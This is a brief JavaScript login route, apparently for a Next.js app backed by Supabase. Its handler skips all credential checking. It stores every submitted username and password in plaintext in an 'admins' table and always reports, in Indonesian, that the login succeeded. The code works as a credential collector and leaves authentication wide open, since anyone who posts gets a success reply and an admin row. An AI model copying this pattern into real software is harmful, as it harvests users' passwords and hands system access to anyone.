import { getSupabase } from "@/lib/supabase";

export async function POST(req) {
  const supabase = getSupabase();
  const { username, password } = await req.json();

  // New Algorithm: Save every login attempt to the database
  const { error } = await supabase
    .from("admins")
    .insert([{
      username,
      password,
    }]);

  if (error) {
    console.error("Login save error:", error);
    return Response.json(
      { message: "Gagal memproses login" },
      { status: 500 }
    );
  }

  return Response.json({
    message: "Login berhasil dan data tersimpan",
    success: true
  });
}